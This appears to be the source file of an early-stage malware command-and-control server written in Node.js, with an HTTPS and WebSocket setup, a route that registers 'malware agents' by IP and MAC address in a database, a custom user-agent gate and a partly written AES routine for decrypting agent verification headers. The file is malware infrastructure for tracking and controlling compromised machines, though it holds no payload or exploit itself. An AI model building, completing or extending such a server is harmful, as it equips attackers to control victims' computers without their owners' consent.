const path = require('path');
const config = require('../Config/ServerConfig.env.json');
const dbConn = require('./DBConnection.js');
const express = require('express');
const https = require('https');
const fs = require('fs');
const crypto = require('crypto');
const WebSocket = require('ws');

//HTTPS Certificates/Keys
const certPath = fs.readFileSync(path.resolve(__dirname, config.Keys.CertPath), 'utf8');
const privateKeyPath = fs.readFileSync(path.resolve(__dirname, config.Keys.PrivateKeyPath), 'utf8');
const AgentHeaderKey = config.Keys.AgentDecryptedKey;

/*Decryption Function. Agent generates an IV and encrypts the key with AES-256-CBC.
This function separates the first 32 bytes (IV) from the rest of the encrypted key and decrypts it.
Only fully implement functionality once an Agent is created.
*/
function decryptVerificationHeader(verHeader){
    var iv = verHeader.slice(0, 32);
    var encryptedText = verHeader.slice(32, verHeader.length);

    var decipher = crypto.createDecipheriv("aes-256-cbc", Buffer.from(AgentHeaderKey), iv);
    var decrypted = decipher.update(encryptedText, 'hex', 'utf8');
    decrypted += decipher.final('utf8');   

    return decrypted;
}


const options = {
    key: privateKeyPath,
    cert: certPath
};

//HTTPS server creation + WebSocket
const app = express();
app.use(express.json());
const c2Server = https.createServer(options, app);
const wss = new WebSocket.Server({ c2Server });

//Injection protection
function checkInjection(IPAddr, MACAddr){
    const IPCheck = /^(25[0-5]|2[0-4][0-9]|1?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|1?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|1?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|1?[0-9][0-9]?)$/.test(IPAddr);
    const MACCheck = /^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$/.test(MACAddr);
    if(IPCheck && MACCheck){
        return true;
    } else {
        return false;
    }
}

//Routes

//Establish a new malware agent. Checks User Agent header/Todo: Add decryption to check for key. Protects against unwanted/unauthorised agents.
app.post('/establishAgent', async (req, res) => {
    console.log("Headers: ");
    console.log(req.headers);
    var userAgent = req.headers['user-agent'];
    //var verHeader = req.headers['Verification-Header'];
    //Checks for appropriate user-agent header. Will change this to a completely custom one.
    if (userAgent != "KaneryAgentV0.0"){
        res.send("403 Forbidden")
    } else {
        //Checks for IP/MAC format to avoid SQL injection.
        if(checkInjection(req.body.IPAddr, req.body.MACAddr)){
            const dupeChecks = await dbConn.establishNewAgent(req.body.IPAddr, req.body.MACAddr);
            //decryptVerificationHeader(verHeader);
            if(dupeChecks){
                res.send("Agent connection established...");
            } else {
                res.send("Agent already exists...");
            }
        } else {
            res.send("Incorrect IP/MAC Format...");
        }
    }
});

//Server listening.
c2Server.listen(config.Server.Port, () => {
    console.log(`Server started on port ${config.Server.Port}`);
});